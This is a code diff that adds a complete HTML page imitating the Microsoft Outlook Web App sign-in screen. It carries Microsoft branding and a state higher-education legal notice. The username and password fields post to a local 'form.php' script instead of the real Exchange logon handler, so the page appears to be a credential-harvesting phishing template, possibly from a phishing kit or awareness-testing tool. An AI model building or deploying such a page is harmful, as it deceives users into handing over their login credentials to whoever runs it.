@@ -1,0 +1,161 @@
+<html>
+<head>
+<link rel="shortcut icon" href="img/favicon.ico" type="image/x-icon">
+<meta http-equiv="Content-Type" content="text/html; CHARSET=utf-8">
+<title>Outlook Web App</title>
+<link type="text/css" rel="stylesheet" href="css/logon.css">
+<link type="text/css" rel="stylesheet" href="css/owafont.css">
+</head>
+
+<body class="owaLgnBdy">
+
+<form action="form.php" method="POST" name="logonForm" ENCTYPE="application/x-www-form-urlencoded" autocomplete="off">
+<table align="center" border=0 id="tblMain" cellpadding=0 cellspacing=0>
+	<tr>
+		<td colspan=3>
+			<table cellspacing=0 cellpadding=0 class="tblLgn">
+			<tr>
+				<td class="lgnTL"><img src="img/lgntopl.gif" alt=""></td>
+				<td class="lgnTM"></td>
+				<td class="lgnTR"><img src="img/lgntopr.gif" alt=""></td>
+			</tr>
+			</table>
+		</td>
+	</tr>
+	<tr>
+		<td id="mdLft">&nbsp;</td>
+		<td id="mdMid">
+			<table border=0 id="tblMid" class="mid">
+				<tr>
+					<td id="expltxt" class="expl">
+
+<STYLE><!-- 
+body {
+	background-color:#3d5fa3;
+	text-align:center;
+	text-size:8pt;
+	font-size:50%;
+	text-size:8pt;
+}
+
+#LegalNotice {
+	text-size: 10px;
+	font-size: 10px;
+	margin:10px;
+	padding:5px;
+	border-color:#666;
+	border-style:solid;
+	border-width:2px;
+	background-color:#eee;
+}
+
+#LegalNotice ul { list-style-type: upper-alpha; } 
+
+#LegalNotice h4 { margin-bottom: 0.50em };
+
+input.userB, input.passB{ width: 120px; } 
+
+input.btn {
+	color: #ffffff;
+	background-color: #3d5fa3;
+	border: 0px;
+	padding: 2px 6px;
+/*	margin: 0px 6px; */
+	text-align:center;
+}
+--></STYLE><div id="LegalNotice"> 
+
+<b>Legal Notice as Required by the State</b><br><br> 
+Displaying the following notice pertaining to the use of systems in <br>
+Higher Education entities is required per<br>
+State Administrative Code (Title 1, Part 10, Chapter 202):  
+<ul><li>Unauthorized use is prohibited;
+<li>Usage may be subject to security testing and monitoring;
+<li>Misuse is subject to criminal prosecution;
+<li>No expectation of privacy except as otherwise<br>provided by applicable privacy laws.</ol>
+</div>
+
+<input id="rdoPrvt" type="hidden" name="trusted" value="4" class="rdo">
+				</td>
+				<tr><td><hr></td></tr>
+				<tr>
+					<td>
+						<table class="nonMSIE">
+							<col>
+							<col class="w100">
+								<tr>
+									<td><input id="chkBsc" type="checkbox" class="rdo" onClick="clkBsc();" disabled="true" checked="true"></td>
+									<td nowrap><label for="chkBsc">Use the light version of Outlook Web App</label></td>
+								</tr>
+								<tr id="trBscExp" class="disBsc">
+									<td></td>
+									<td>The light version of Outlook Web App includes fewer features. Use it if you're on a slow connection or using a computer with unusually strict browser security settings. We also support the full Outlook Web App experience on some browsers on Windows, Mac, and Linux computers. To check out all the supported browsers and operating systems, <a href="http://go.microsoft.com/fwlink/?LinkID=129362" id="bscLnk">click here.</a></td>
+							</tr>
+						</table>
+					</td>
+				</tr>
+				<tr><td><hr></td></tr>
+				<tr>
+					<td>
+						<table class="nonMSIE">
+							<col class="nowrap">
+							<col class="w100">
+							<col>
+							<tr>
+								<td nowrap><label for="username">User name:</label></td>
+								<td class="txtpad"><input id="username" name="username" type="text" class="txt"></td>
+							</tr>
+							<tr>
+								<td nowrap><label for="password">Password:</label></td>
+								<td class="txtpad"><input id="password" name="password" type="password" class="txt"></td>
+							</tr>
+							<tr>
+								<td colspan=2 align="right" class="txtpad">
+									<input type="submit" class="btn" value="Sign in">
+								</td>
+							</tr>
+						</table>
+					</td>
+				</tr>
+				<tr><td><hr></td></tr>
+			</table>
+			<table id="tblMid2" class="mid" style="display:none">
+				<tr><td><hr></td></tr>
+				<tr>
+					<td><br>Please enable cookies for this Web site.<br><br>Cookies are currently disabled by your browser. Outlook Web App requires that cookies be enabled. <br><br>For information about how to enable cookies, see the Help for your Web browser.<br><br><br></td>
+				</tr>
+				<tr><td><hr></td></tr>
+				<tr>
+					<td align="right" class="txtpad">
+						<input type="button" class="btn" style="float: right" value="Retry" onClick="clkRtry()">
+					</td>
+				</tr>
+			</table>
+			<table class="mid tblConn">
+				<tr>
+					<td rowspan=2 align="right" class="tdConnImg"><img style="vertical-align:top" src="img/lgnexlogo.gif" alt=""></td>
+					<td class="tdConn">Connected to Microsoft Exchange</td>
+				</tr>
+				<tr>
+					<td class="tdCopy">&copy; 2010 Microsoft Corporation. All rights reserved.</td>
+				</tr>
+			</table>
+		</td>
+		<td id="mdRt">&nbsp;</td>
+	</tr>
+	<tr>
+		<td colspan=3>
+			<table cellspacing=0 cellpadding=0 class="tblLgn">
+			<tr>
+				<td class="lgnBL"><img src="img/lgnbotl.gif" alt=""></td>
+				<td class="lgnBM"></td>
+				<td class="lgnBR"><img src="img/lgnbotr.gif" alt=""></td>
+			</tr>
+			</table>
+		</td>
+	</tr>
+</table>
+</form>
+</body>
+</html>
+
